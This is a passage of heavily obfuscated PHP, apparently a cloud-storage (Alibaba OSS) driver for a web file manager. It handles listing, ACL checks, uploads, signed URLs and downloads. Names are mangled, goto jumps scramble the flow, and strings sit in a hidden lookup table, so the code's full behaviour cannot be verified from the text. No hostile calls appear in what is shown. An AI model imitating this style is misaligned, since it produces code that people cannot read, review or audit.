$c»—´ãÖºç =& $_SERVER[£¿ÌÙëü¡¯¯]; $e¢∏Ì•ïÂÍ = array($c»—´ãÖºç[28] => $this->pathThis($BÓ∑‘÷Ñ‘Ö), $c»—´ãÖºç[76] => $this->getPathOuter($c»—´ãÖºç[8] . $BÓ∑‘÷Ñ‘Ö), $c»—´ãÖºç[29] => $c»—´ãÖºç[77], $c»—´ãÖºç[184] => 0, $c»—´ãÖºç[108] => 0, $c»—´ãÖºç[185] => !0, $c»—´ãÖºç[186] => !0); if (empty($B¨ÎŸÙáäÆ)) { $BÓ∑‘÷Ñ‘Ö = rtrim($BÓ∑‘÷Ñ‘Ö, $c»—´ãÖºç[8]) . $c»—´ãÖºç[8]; $BäΩ§çáµ¡ = $this->objectMeta($BÓ∑‘÷Ñ‘Ö); if (!$BäΩ§çáµ¡) { return $e¢∏Ì•ïÂÍ; } $B¨ÎŸÙáäÆ = array($c»—´ãÖºç[184] => $BäΩ§çáµ¡[$c»—´ãÖºç[1159]][$c»—´ãÖºç[1160]], $c»—´ãÖºç[108] => strtotime($BäΩ§çáµ¡[$c»—´ãÖºç[1157]])); } if (isset($B¨ÎŸÙáäÆ[$c»—´ãÖºç[108]])) { $e¢∏Ì•ïÂÍ[$c»—´ãÖºç[108]] = $B¨ÎŸÙáäÆ[$c»—´ãÖºç[108]]; } if (isset($B¨ÎŸÙáäÆ[$c»—´ãÖºç[184]])) { $e¢∏Ì•ïÂÍ[$c»—´ãÖºç[184]] = $B¨ÎŸÙáäÆ[$c»—´ãÖºç[184]]; } return $e¢∏Ì•ïÂÍ; } public function listPath($côï¨ıî“Ì, $EÎ—Êã‹ùƒ = false) { $bâ∫Œ“ﬁ»– =& $_SERVER[£¿ÌÙëü¡¯¯]; $aÎ∆ç¿›ê« = $this->fileList($côï¨ıî“Ì, $bâ∫Œ“ﬁ»–[8], !0); foreach ($aÎ∆ç¿›ê«[$bâ∫Œ“ﬁ»–[75]] as $a⁄’ˆ≥û§Ë => $FÇ¬âª¯˜é) { $aÎ∆ç¿›ê«[$bâ∫Œ“ﬁ»–[75]][$a⁄’ˆ≥û§Ë] = $this->folderInfo($FÇ¬âª¯˜é, $FÇ¬âª¯˜é); } foreach ($aÎ∆ç¿›ê«[$bâ∫Œ“ﬁ»–[74]] as $a⁄’ˆ≥û§Ë => $FÇ¬âª¯˜é) { $aÎ∆ç¿›ê«[$bâ∫Œ“ﬁ»–[74]][$a⁄’ˆ≥û§Ë] = $this->fileInfo($FÇ¬âª¯˜é[$bâ∫Œ“ﬁ»–[28]], $FÇ¬âª¯˜é); } return $aÎ∆ç¿›ê«; } public function has($EÙ‹çºŒŒÏ, $F—«óóŸ⁄˘ = false, $aÚœ√ΩÔﬂ≤ = true) { goto bÒ»≤ïﬂ‰ª; DÓóŸô∆Ç≥: $dﬁ¶ÚâŒáÖ = $cÂÙ∑£àÆπ[33]; $a°Á—ΩÇçä = 500; $a›Ô¯ùÂíÜ = 0; goto BÕë¥°Ü∂Ç; BÕë¥°Ü∂Ç: $DŸãâúƒÌ¯ = 0; while (!0) { $f£≠øåÑ‹‚ = array($cÂÙ∑£àÆπ[1148] => $cÂÙ∑£àÆπ[8], $cÂÙ∑£àÆπ[183] => $DÍ·–º∫ÎÑ, $cÂÙ∑£àÆπ[1149] => $a°Á—ΩÇçä, $cÂÙ∑£àÆπ[1150] => $dﬁ¶ÚâŒáÖ); try { $aó€¶õë’‘ = $this->client->listObjects($this->bucket, $f£≠øåÑ‹‚); } catch (OSS\Core\OssException $dõáÔñ¬·´) { break; } $dﬁ¶ÚâŒáÖ = $aó€¶õë’‘->getNextMarker(); $Dçõ÷ñÌòÃ = $aó€¶õë’‘->getObjectList(); $fâÏá◊ÔÔÁ = $aó€¶õë’‘->getPrefixList(); if ($F—«óóŸ⁄˘) { if (count($Dçõ÷ñÌòÃ) > 1 || count($Dçõ÷ñÌòÃ) == 1 && $Dçõ÷ñÌòÃ[0]->getKey() != $DÍ·–º∫ÎÑ) { $a›Ô¯ùÂíÜ += count($Dçõ÷ñÌòÃ) - 1; } if (!empty($fâÏá◊ÔÔÁ)) { $DŸãâúƒÌ¯ += count($fâÏá◊ÔÔÁ); } if ($dﬁ¶ÚâŒáÖ === $cÂÙ∑£àÆπ[33]) { break; } continue; } if ($aÚœ√ΩÔﬂ≤) { if (!empty($Dçõ÷ñÌòÃ)) { if (count($Dçõ÷ñÌòÃ) > 1 || $Dçõ÷ñÌòÃ[0]->getKey() != $DÍ·–º∫ÎÑ) { return !0; } } } else { if (!empty($fâÏá◊ÔÔÁ)) { return !0; } } if ($dﬁ¶ÚâŒáÖ === $cÂÙ∑£àÆπ[33]) { break; } } if ($F—«óóŸ⁄˘) { return array($cÂÙ∑£àÆπ[188] => $a›Ô¯ùÂíÜ, $cÂÙ∑£àÆπ[189] => $DŸãâúƒÌ¯); } goto Bæ¨Òå®Û·; bÒ»≤ïﬂ‰ª: $cÂÙ∑£àÆπ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EÙ‹çºŒŒÏ = trim($EÙ‹çºŒŒÏ, $cÂÙ∑£àÆπ[8]); $DÍ·–º∫ÎÑ = empty($EÙ‹çºŒŒÏ) ? $cÂÙ∑£àÆπ[33] : $EÙ‹çºŒŒÏ . $cÂÙ∑£àÆπ[8]; goto DÓóŸô∆Ç≥; Bæ¨Òå®Û·: return !1; goto fä§ÖÖŸŸÒ; fä§ÖÖŸŸÒ: } public function listAll($cì´Ï¶åß⁄) { $F≤ã•◊–ûÁ =& $_SERVER[£¿ÌÙëü¡¯¯]; $b€ÿà¨»≠Ç = $this->fileList($cì´Ï¶åß⁄, $F≤ã•◊–ûÁ[33], !0); $EÏ™∆ü∏–∆ = array(); foreach ($b€ÿà¨»≠Ç[$F≤ã•◊–ûÁ[74]] as $FàíÎ◊‰äÕ) { $EÏ™∆ü∏–∆[$FàíÎ◊‰äÕ[$F≤ã•◊–ûÁ[28]]] = $FàíÎ◊‰äÕ[$F≤ã•◊–ûÁ[78]]; } return $this->listAllFiles($cì´Ï¶åß⁄, array_keys($EÏ™∆ü∏–∆), $EÏ™∆ü∏–∆); } public function canRead($bÜÃÖ≥Ê˜ô) { $AﬂÍµÉÇà≤ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cÃîåãôïﬂ = $this->pathAcl($bÜÃÖ≥Ê˜ô); return $cÃîåãôïﬂ == $AﬂÍµÉÇà≤[1161] || $cÃîåãôïﬂ == $AﬂÍµÉÇà≤[483] ? !0 : !1; } public function canWrite($B◊¨öÿ™∆›) { $CÎ º≠ùÆ∏ = $this->pathAcl($B◊¨öÿ™∆›); return $CÎ º≠ùÆ∏ == $_SERVER[£¿ÌÙëü¡¯¯][483] ? !0 : !1; } public function pathAcl($FﬂıÈÁÆıò) { goto FÑ§Ÿ«ƒùº; FÑ§Ÿ«ƒùº: $Bñ–£ıô‘€ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $bíìá¿õ¨® = $this->client->getObjectAcl($this->bucket, $FﬂıÈÁÆıò); } catch (OSS\Core\OssException $F¶†™á∏Ó›) { return !1; } goto bäÑ±∞Ñ€•; bäÑ±∞Ñ€•: $có∏å¡ÿÖç = $bíìá¿õ¨® == $Bñ–£ıô‘€[34] ? $this->bucketAcl : $bíìá¿õ¨®; if ($có∏å¡ÿÖç == $Bñ–£ıô‘€[1162]) { return $Bñ–£ıô‘€[1161]; } if ($có∏å¡ÿÖç == $Bñ–£ıô‘€[1163]) { return $Bñ–£ıô‘€[483]; } goto EÍ≈àı•∆¥; EÍ≈àı•∆¥: return $có∏å¡ÿÖç; goto B⁄£ÍÜ›Êﬂ; B⁄£ÍÜ›Êﬂ: } private function chmodPath($F£‡Æ÷º˜¬, $EÕâ¢«›ıí = '') { $B∏Úßπæ‘≤ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EúÉ÷⁄ò§› = empty($EÕâ¢«›ıí) ? $B∏Úßπæ‘≤[1163] : $EÕâ¢«›ıí; $A‘“ÇåÛ√ = array($B∏Úßπæ‘≤[34], $B∏Úßπæ‘≤[182], $B∏Úßπæ‘≤[1162], $B∏Úßπæ‘≤[1163]); if (!in_array($EúÉ÷⁄ò§›, $A‘“ÇåÛ√)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $F£‡Æ÷º˜¬, $EúÉ÷⁄ò§›); } catch (OSS\Core\OssException $C®Ò≈√ììÏ) { return !1; } return !0; } public function getContent($d©¨⁄ù’áÁ) { return $this->fileSubstr($d©¨⁄ù’áÁ, -1); } public function setContent($C±ˆ∑Ê∆È–, $a››ø∏ÂÑæ = '') { $eÓΩê ßïΩ =& $_SERVER[£¿ÌÙëü¡¯¯]; try { $fÆ§¢Øòäî = $this->trafficLimit($eÓΩê ßïΩ[1164]); $dõèëÜıñ∆ = $this->client->putObject($this->bucket, $C±ˆ∑Ê∆È–, $a››ø∏ÂÑæ, $fÆ§¢Øòäî); } catch (OSS\Core\OssException $D≈ŒØ∂√üá) { return !1; } $C¨—ﬁÒ„£Á = array($eÓΩê ßïΩ[1151] => trim($dõèëÜıñ∆[$eÓΩê ßïΩ[1165]], $eÓΩê ßïΩ[114]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($C±ˆ∑Ê∆È–))); $this->updateObjMeta($C±ˆ∑Ê∆È–, $C¨—ﬁÒ„£Á); return isset($dõèëÜıñ∆[$eÓΩê ßïΩ[1166]][$eÓΩê ßïΩ[1112]]) ? (int) $dõèëÜıñ∆[$eÓΩê ßïΩ[1166]][$eÓΩê ßïΩ[1112]] : strlen($dõèëÜıñ∆); } private function updateObjMeta($FÃ®Ø‡Ôéì, $C∑ΩÜ√Úß°) { try { $Bﬂç®ŸÜ» = array(OSS\OssClient::OSS_HEADERS => $C∑ΩÜ√Úß°); $this->client->copyObject($this->bucket, $FÃ®Ø‡Ôéì, $this->bucket, $FÃ®Ø‡Ôéì, $Bﬂç®ŸÜ»); } catch (OSS\Core\OssException $FÖ≤£ÃÛ∂ê) { return !1; } return !0; } public function upload($f¢ÆÑΩ—«¯, $f“⁄Ï™•ﬁ¢, $A°∏ﬁπõç∫ = false, $E„ÆëáØ±ü = REPEAT_REPLACE) { $CÉçÍÆÀì¬ =& $_SERVER[£¿ÌÙëü¡¯¯]; $BÍ‹ü¨ø€à = trim($f¢ÆÑΩ—«¯, $CÉçÍÆÀì¬[8]); $D»Çö›èá› = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($CÉçÍÆÀì¬[1151] => @md5_file($f“⁄Ï™•ﬁ¢)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($f¢ÆÑΩ—«¯))); $D»Çö›èá› = $this->trafficLimit($CÉçÍÆÀì¬[1164], $D»Çö›èá›); try { $this->client->multiuploadFile($this->bucket, $BÍ‹ü¨ø€à, $f“⁄Ï™•ﬁ¢, $D»Çö›èá›); } catch (OSS\Core\OssException $E∆¶◊Ò¶ÈÕ) { return !1; } return $this->getPathOuter($f¢ÆÑΩ—«¯); } public function getHost() { $aëÆ≈î—‡§ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Dùáü‰øèø = explode($aëÆ≈î—‡§[168], parent::getHost()); return $Dùáü‰øèø[0] . $aëÆ≈î—‡§[168] . $this->bucket . $aëÆ≈î—‡§[94] . $Dùáü‰øèø[1]; } public function uploadFormData($dˆ¶±é÷Íã, $A∑Í‚ﬁ¡ ç = 3600) { goto CñÖ¬Ÿ†Ê‡; CñÖ¬Ÿ†Ê‡: $A£›ﬂ°„å™ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!($dÔåùµ¡àÖ = $this->getHost())) { return !1; } $b…öΩêÛ…≤ = $A∑Í‚ﬁ¡ ç; goto dêè–·ÙÓ„; E©»‡ÃŸÿŒ: return $a¿√íõ∞ãÑ; goto a„≈⁄» Áá; AﬁÍ—˜à—á: $CƒöÔû¥ƒÈ = $this->pathFather($dˆ¶±é÷Íã); $Dåã∏ÃøÇâ = array($A£›ﬂ°„å™[1069] => $cóò£ŒìΩƒ, $A£›ﬂ°„å™[1070] => array(array($A£›ﬂ°„å™[1169], 0, $B«äÊÍ„¢Ù), array($A£›ﬂ°„å™[1073], $A£›ﬂ°„å™[1074], $CƒöÔû¥ƒÈ))); $eüÚØ—‘¡√ = base64_encode(json_encode($Dåã∏ÃøÇâ)); goto Aå√°ƒ—Áö; e·°¢«§ºΩ: $C öÖ‚‹Ïü = strpos($cóò£ŒìΩƒ, $A£›ﬂ°„å™[281]); $cóò£ŒìΩƒ = substr($cóò£ŒìΩƒ, 0, $C öÖ‚‹Ïü) . $A£›ﬂ°„å™[1168]; $B«äÊÍ„¢Ù = 1048576000 * 5; goto AﬁÍ—˜à—á; dêè–·ÙÓ„: $eïΩØÖ≈àó = date($A£›ﬂ°„å™[1167], time() + $b…öΩêÛ…≤); $Dåﬂˆ÷ô„ú = new DateTime($eïΩØÖ≈àó); $cóò£ŒìΩƒ = $Dåﬂˆ÷ô„ú->format(DateTime::ISO8601); goto e·°¢«§ºΩ; Aå√°ƒ—Áö: $D√Ô∫‘â°· = base64_encode(hash_hmac($A£›ﬂ°„å™[215], $eüÚØ—‘¡√, $this->secret, !0)); $a¿√íõ∞ãÑ = array($A£›ﬂ°„å™[1079] => $eüÚØ—‘¡√, $A£›ﬂ°„å™[1170] => $this->accessKey, $A£›ﬂ°„å™[1075] => $A£›ﬂ°„å™[1067], $A£›ﬂ°„å™[1171] => $D√Ô∫‘â°·, $A£›ﬂ°„å™[166] => $dÔåùµ¡àÖ); $a¿√íõ∞ãÑ = $this->trafficLimit($A£›ﬂ°„å™[1164], $a¿√íõ∞ãÑ); goto E©»‡ÃŸÿŒ; a„≈⁄» Áá: } public function multiUploadFormData($b∫Æ≥”»é∆, $eŒ—∞öàì® = 3600) { $Aæ≥Éà°Ï† =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!($B∆®ÆÜì‰÷ = $this->getHost())) { return !1; } $Dﬂ∫¬⁄ÁÉØ = $this->trafficLimit($Aæ≥Éà°Ï†[1164]); $c∆‚ı»òÉ˜ = $this->client->initiateMultipartUpload($this->bucket, $b∫Æ≥”»é∆, $Dﬂ∫¬⁄ÁÉØ); return array($Aæ≥Éà°Ï†[206] => $c∆‚ı»òÉ˜, $Aæ≥Éà°Ï†[166] => $B∆®ÆÜì‰÷ . $Aæ≥Éà°Ï†[8] . $this->pathEncode($b∫Æ≥”»é∆), $Aæ≥Éà°Ï†[207] => gmdate($Aæ≥Éà°Ï†[1172]), $Aæ≥Éà°Ï†[90] => $b∫Æ≥”»é∆); } public function multiUploadAuthData($C ΩÜÈ°›ô, $C˜“á°‚í = array()) { goto eÆÊÈƒ⁄ß¯; b˜Çˆ‰ïø™: $e◊ôàÚŸÙì = array($B›∂≠Ω÷Éß[209], $B›∂≠Ω÷Éß[33], $B›∂≠Ω÷Éß[117], $Dï≈πÿµÖò, "\x78\x2d\x6f\163\163\x2d\x64\141\164\145\x3a{$Dï≈πÿµÖò}", $B›∂≠Ω÷Éß[8] . $this->bucket . $B›∂≠Ω÷Éß[8] . $eïâ–õı≈π . $C¥’ÌóÏÓ); if (strpos($C¥’ÌóÏÓ, $B›∂≠Ω÷Éß[210]) === 0) { $e◊ôàÚŸÙì[0] = $B›∂≠Ω÷Éß[211]; if ($EÈÜœü◊é“ = $this->trafficLimit($B›∂≠Ω÷Éß[1164])) { $eïâ–õı≈π = $B›∂≠Ω÷Éß[1173]; array_splice($e◊ôàÚŸÙì, 5, 0, $eïâ–õı≈π . $B›∂≠Ω÷Éß[4] . $EÈÜœü◊é“[$eïâ–õı≈π]); } } if (isset($C˜“á°‚í[$B›∂≠Ω÷Éß[212]]) && $C˜“á°‚í[$B›∂≠Ω÷Éß[212]] == $B›∂≠Ω÷Éß[213]) { $e◊ôàÚŸÙì[0] = $B›∂≠Ω÷Éß[213]; } goto e±¯îÜ·Ç±; e±¯îÜ·Ç±: if (!empty($C˜“á°‚í[$B›∂≠Ω÷Éß[1174]])) { $aΩé¡îåÃë = array_merge(array($e◊ôàÚŸÙì[4]), $C˜“á°‚í[$B›∂≠Ω÷Éß[1174]]); sort($aΩé¡îåÃë); $e◊ôàÚŸÙì[4] = implode($B›∂≠Ω÷Éß[214], $aΩé¡îåÃë); } $e—ËÕÕÀ“Ù = implode($B›∂≠Ω÷Éß[214], $e◊ôàÚŸÙì); $eáèœ¨õ· = base64_encode(hash_hmac($B›∂≠Ω÷Éß[215], $e—ËÕÕÀ“Ù, $this->secret, !0)); goto dí»Õ∞¢€≤; eÆÊÈƒ⁄ß¯: $B›∂≠Ω÷Éß =& $_SERVER[£¿ÌÙëü¡¯¯]; $Dï≈πÿµÖò = isset($C˜“á°‚í[$B›∂≠Ω÷Éß[207]]) ? $C˜“á°‚í[$B›∂≠Ω÷Éß[207]] : gmdate($B›∂≠Ω÷Éß[1172]); $C¥’ÌóÏÓ = isset($C˜“á°‚í[$B›∂≠Ω÷Éß[157]]) ? $C˜“á°‚í[$B›∂≠Ω÷Éß[157]] : $B›∂≠Ω÷Éß[33]; goto b√Â–’çùõ; b√Â–’çùõ: $eïâ–õı≈π = $C ΩÜÈ°›ô; if (isset($C˜“á°‚í[$B›∂≠Ω÷Éß[90]])) { $eïâ–õı≈π = $C˜“á°‚í[$B›∂≠Ω÷Éß[90]]; unset($C˜“á°‚í[$B›∂≠Ω÷Éß[90]]); } if (isset($C˜“á°‚í[$B›∂≠Ω÷Éß[208]])) { $C˜“á°‚í[$B›∂≠Ω÷Éß[207]] = $Dï≈πÿµÖò; return $this->listUploadParts($eïâ–õı≈π, $C˜“á°‚í); } goto b˜Çˆ‰ïø™; dí»Õ∞¢€≤: $dÎŒåûäüá = $B›∂≠Ω÷Éß[1175] . $this->accessKey . $B›∂≠Ω÷Éß[4] . $eáèœ¨õ·; if (strpos($C¥’ÌóÏÓ, $B›∂≠Ω÷Éß[210]) === 0) { $dÎŒåûäüá = array($B›∂≠Ω÷Éß[217] => $dÎŒåûäüá, $B›∂≠Ω÷Éß[207] => $Dï≈πÿµÖò); if ($EÈÜœü◊é“) { $dÎŒåûäüá = array_merge($dÎŒåûäüá, $EÈÜœü◊é“); } } return $dÎŒåûäüá; goto A∫Ó‡æêé‹; A∫Ó‡æêé‹: } public function listUploadParts($e¿øÓÙ®ÔÓ, $Fè˜ú¨ªﬁ†) { goto fÌÀÙõ±—∞; DïÚßë·≈‡: return array($B®Ô∑∆®å«[217] => $bŒŸπõÍÊÚ, $B®Ô∑∆®å«[207] => $Fè˜ú¨ªﬁ†[$B®Ô∑∆®å«[207]], $B®Ô∑∆®å«[219] => $F¢¬∞ıâ∞·); goto bìøÙêÁ©“; bàåÌÏ’ôØ: unset($Fè˜ú¨ªﬁ†[$B®Ô∑∆®å«[208]], $Fè˜ú¨ªﬁ†[$B®Ô∑∆®å«[212]]); $bŒŸπõÍÊÚ = $this->multiUploadAuthData($e¿øÓÙ®ÔÓ, $Fè˜ú¨ªﬁ†); if (empty($bŒŸπõÍÊÚ)) { return !1; } goto DïÚßë·≈‡; fÌÀÙõ±—∞: $B®Ô∑∆®å« =& $_SERVER[£¿ÌÙëü¡¯¯]; $dº¢ä·ëÛì = parse_url_query($Fè˜ú¨ªﬁ†[$B®Ô∑∆®å«[157]]); $eÁ©’„§   = $this->client->listParts($this->bucket, $e¿øÓÙ®ÔÓ, $dº¢ä·ëÛì[$B®Ô∑∆®å«[206]]); goto Aóú£ ¯à‰; Aóú£ ¯à‰: $f¿Œ√π†°ÿ = $eÁ©’„§  ->getListPart(); $F¢¬∞ıâ∞· = array(); foreach ($f¿Œ√π†°ÿ as $Aó¨°ÔÊ’ó) { $F¢¬∞ıâ∞·[] = array($B®Ô∑∆®å«[1155] => $Aó¨°ÔÊ’ó->getPartNumber(), $B®Ô∑∆®å«[1156] => trim($Aó¨°ÔÊ’ó->getETag(), $B®Ô∑∆®å«[114])); } goto bàåÌÏ’ôØ; bìøÙêÁ©“: } public function download($e°ÃÏÀ‘¬€, $Aëˆÿêô¡ñ) { if ($this->isFolder($e°ÃÏÀ‘¬€)) { return !1; } try { $cÙ€¢œèÂÖ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Aëˆÿêô¡ñ); $cÙ€¢œèÂÖ = $this->trafficLimit($_SERVER[£¿ÌÙëü¡¯¯][106], $cÙ€¢œèÂÖ); $this->client->getObject($this->bucket, $e°ÃÏÀ‘¬€, $cÙ€¢œèÂÖ); } catch (OSS\Core\OssException $EßôÏé¨ï‚) { return !1; } return $Aëˆÿêô¡ñ; } public function fileSubstr($E¶¬ç⁄ÏÃÍ, $Fãﬁëãıí¥ = 0, $FÏÎ–∆Î≠ä = false) { if ($Fãﬁëãıí¥ === -1) { $F‰±‘àë”¡ = array(); } else { if ($FÏÎ–∆Î≠ä === !1) { $Aó°ëﬂÏüÑ = $this->size($E¶¬ç⁄ÏÃÍ); } else { $Aó°ëﬂÏüÑ = $Fãﬁëãıí¥ + $FÏÎ–∆Î≠ä - 1; } $F‰±‘àë”¡ = array(OSS\OssClient::OSS_RANGE => "{$Fãﬁëãıí¥}\55{$Aó°ëﬂÏüÑ}"); } try { return $this->client->getObject($this->bucket, $E¶¬ç⁄ÏÃÍ, $F‰±‘àë”¡); } catch (OSS\Core\OssException $B†◊«Ü‚ıä) { think_exception($B†◊«Ü‚ıä->getMessage()); return !1; } } private function trafficLimit($dı◊Üô∆Ç‡, $fÔ±…‹Ùı∫ = array()) { goto A˜∏«Ë™≠«; F¯Æ’—⁄ä«: if (!$A‚‘èË¬ò…) { return $fÔ±…‹Ùı∫; } $A‚‘èË¬ò… = $A‚‘èË¬ò… < 819200 ? 819200 : ($A‚‘èË¬ò… > 838860800 ? 838860800 : $A‚‘èË¬ò…); $fÔ±…‹Ùı∫[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($A‚‘èË¬ò…); goto D•ﬁßöá„ ; A˜∏«Ë™≠«: $Aäπç◊÷Øá =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($dı◊Üô∆Ç‡ == $Aäπç◊÷Øá[1164] && $this->isUploadServer() || $dı◊Üô∆Ç‡ == $Aäπç◊÷Øá[106] && $this->isFileOutServer()) { return $fÔ±…‹Ùı∫; } $A‚‘èË¬ò… = floatval($GLOBALS[$Aäπç◊÷Øá[6]][$Aäπç◊÷Øá[85]][$Aäπç◊÷Øá[92]][$dı◊Üô∆Ç‡]) * 1024 * 1024 * 8; goto F¯Æ’—⁄ä«; D•ﬁßöá„ : return $fÔ±…‹Ùı∫; goto f±®óåïéœ; f±®óåïéœ: } public function link($BÒé é—ó√, $dﬁ¨ôË‡ï = array()) { $c≤≥ˆªæ“¢ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->exist($BÒé é—ó√) || $this->isFolder($BÒé é—ó√)) { return !1; } try { $dﬁ¨ôË‡ï = $this->trafficLimit($c≤≥ˆªæ“¢[106], $dﬁ¨ôË‡ï); $DË‡Œ≥î∂≤ = $this->client->signUrl($this->bucket, $BÒé é—ó√, 3600 * 12, $c≤≥ˆªæ“¢[213], $dﬁ¨ôË‡ï); return $this->getCdnLink($DË‡Œ≥î∂≤); } catch (OSS\Core\OssException $fëÀãëàëî) { return !1; } } public function fileOut($cñ÷êú∞ö≈, $bü∆÷ï≤§â = false, $F√áÆ‹⁄Öπ = false, $DΩóÛõÆê… = '') { goto F∫´ÑñΩÒÖ; A„∏«‰´‘ô: $c…Áèπ„ú»[OSS\OssClient::OSS_SUB_RESOURCE] .= $Dâ¨Î∞¬éÎ[1177] . $b¥ÌÍìÇﬂ¨; $fπ·Á≈«îû = $this->link($cñ÷êú∞ö≈, $c…Áèπ„ú»); $this->fileOutLink($fπ·Á≈«îû); goto D˜¯´Ì®á§; bŒøŒÈñÍ∑: if ($b¥ÌÍìÇﬂ¨ == $Dâ¨Î∞¬éÎ[198]) { return parent::fileOut($cñ÷êú∞ö≈, $bü∆÷ï≤§â, $F√áÆ‹⁄Öπ, $DΩóÛõÆê…); } $bü∆÷ï≤§â = $bü∆÷ï≤§â ? $Dâ¨Î∞¬éÎ[199] : $Dâ¨Î∞¬éÎ[200]; $c…Áèπ„ú» = array(OSS\OssClient::OSS_SUB_RESOURCE => $Dâ¨Î∞¬éÎ[1176] . rawurlencode("{$bü∆÷ï≤§â}\x3b\x66\x69\154\x65\156\x61\155\145\x3d{$F√áÆ‹⁄Öπ}")); goto A„∏«‰´‘ô; F∫´ÑñΩÒÖ: $Dâ¨Î∞¬éÎ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$F√áÆ‹⁄Öπ) { $F√áÆ‹⁄Öπ = $this->pathThis($cñ÷êú∞ö≈); } $b¥ÌÍìÇﬂ¨ = get_file_mime(get_path_ext($F√áÆ‹⁄Öπ)); goto bŒøŒÈñÍ∑; D˜¯´Ì®á§: } public function fileOutServer($Cé¶òâŸ◊, $f√—‚îóıƒ = false, $Bì—Œ˘äƒî = false, $d˜ÜŸ‚¿œˆ = '') { parent::fileOut($Cé¶òâŸ◊, $f√—‚îóıƒ, $Bì—Œ˘äƒî, $d˜ÜŸ‚¿œˆ); } public function fileOutImage($c•ﬂ√‚Æ≠‡, $d‡«±œ›†Ó = 250) { $Eëó‡¡Û¿ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[£¿ÌÙëü¡¯¯][1178] . $d‡«±œ›†Ó); $B–îº†⁄•• = $this->link($c•ﬂ√‚Æ≠‡, $Eëó‡¡Û¿); $this->fileOutLink($B–îº†⁄••); } public function fileOutImageServer($a˘íÌëŒ¢, $Eé≈ù⁄ã¡î = 250) { parent::fileOutImage($a˘íÌëŒ¢, $Eé≈ù⁄ã¡î); } public function fileOutLink($dß°ê®‰–Æ) { $Dá’ñÌÍÛû =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->isCdnHost() && substr($dß°ê®‰–Æ, 0, 7) == $Dá’ñÌÍÛû[1082]) { $dß°ê®‰–Æ = $Dá’ñÌÍÛû[1083] . substr($dß°ê®‰–Æ, 7); } header($Dá’ñÌÍÛû[153] . $dß°ê®‰–Æ); die; } public function hashMd5($f‰›ƒ∑ƒç¥, $a§Œ”ãîÃﬁ = '') { $A±∏®„ñ˘ç =& $_SERVER[£¿ÌÙëü¡¯¯]; $AÖí∏æÑ“¿ = $this->objectMeta($f‰›ƒ∑ƒç¥); if (!$AÖí∏æÑ“¿) { return $A±∏®„ñ˘ç[33]; } if (!isset($AÖí∏æÑ“¿[$A±∏®„ñ˘ç[1151]]) && !empty($a§Œ”ãîÃﬁ)) { $A¯®ÖÊµª° = $this->updateObjMeta($f‰›ƒ∑ƒç¥, array($A±∏®„ñ˘ç[1151] => $a§Œ”ãîÃﬁ)); $AÖí∏æÑ“¿[$A±∏®„ñ˘ç[1151]] = $A¯®ÖÊµª° ? $a§Œ”ãîÃﬁ : $A±∏®„ñ˘ç[33]; } return isset($AÖí∏æÑ“¿[$A±∏®„ñ˘ç[1151]]) ? strtolower($AÖí∏æÑ“¿[$A±∏®„ñ˘ç[1151]]) : $A±∏®„ñ˘ç[33]; } public function size($C‚Ú¡œ•≤—) { $cåÈ±Î‚◊∂ = $this->objectMeta($C‚Ú¡œ•≤—); return $cåÈ±Î‚◊∂ ? $cåÈ±Î‚◊∂[$_SERVER[£¿ÌÙëü¡¯¯][78]] : 0; } public function info($fÃ ÿöï∂®) { if ($this->isFolder($fÃ ÿöï∂®)) { return $this->folderInfo($fÃ ÿöï∂®); } else { if ($this->isFile($fÃ ÿöï∂®)) { return $this->fileInfo($fÃ ÿöï∂®); } } return !1; } public function exist($eí≤‰Éë≥) { return $this->isFile($eí≤‰Éë≥) || $this->isFolder($eí≤‰Éë≥); } public function isFile($f∏È√—Æ˜©) { return !$this->isFolder($f∏È√—Æ˜©) && $this->objectMeta($f∏È√—Æ˜©); } public function isFolder($Eù·ßåƒñ¥) { return $this->cacheMethod($_SERVER[£¿ÌÙëü¡¯¯][220], $Eù·ßåƒñ¥); } protected function objectMeta($dâﬂÌÌ∂›©) { return $this->cacheMethod($_SERVER[£¿ÌÙëü¡¯¯][221], $dâﬂÌÌ∂›©); } protected function _objectMeta($D¨ã≤„Ø∑Ã) { $F±£Éüﬁíì =& $_SERVER[£¿ÌÙëü¡¯¯]; try { $B¯¥è¢çó’ = $this->client->getObjectMeta($this->bucket, $D¨ã≤„Ø∑Ã); } catch (OSS\Core\OssException $BåÒ˜‰ê≤Ô) { $B¯¥è¢çó’ = !1; } if ($B¯¥è¢çó’) { $B¯¥è¢çó’[$F±£Éüﬁíì[78]] = intval($B¯¥è¢çó’[$F±£Éüﬁíì[1158]]); } return $B¯¥è¢çó’; } protected function _isFolder($eµô‰ëŒ£Ì) { $dèÈ∑±Íîù =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($eµô‰ëŒ£Ì == $dèÈ∑±Íîù[33] || $eµô‰ëŒ£Ì == $dèÈ∑±Íîù[8]) { return !0; } $C°€§±Éï‰ = array($dèÈ∑±Íîù[1148] => $dèÈ∑±Íîù[8], $dèÈ∑±Íîù[183] => rtrim($eµô‰ëŒ£Ì, $dèÈ∑±Íîù[8]) . $dèÈ∑±Íîù[8], $dèÈ∑±Íîù[1149] => 1, $dèÈ∑±Íîù[1150] => $dèÈ∑±Íîù[33]); $a∑‘‡Üë·Ω = $this->client->listObjects($this->bucket, $C°€§±Éï‰); if ($a∑‘‡Üë·Ω->getObjectList() || $a∑‘‡Üë·Ω->getPrefixList()) { return !0; } return !1; } } goto eæÙ…ø∏ªØ; 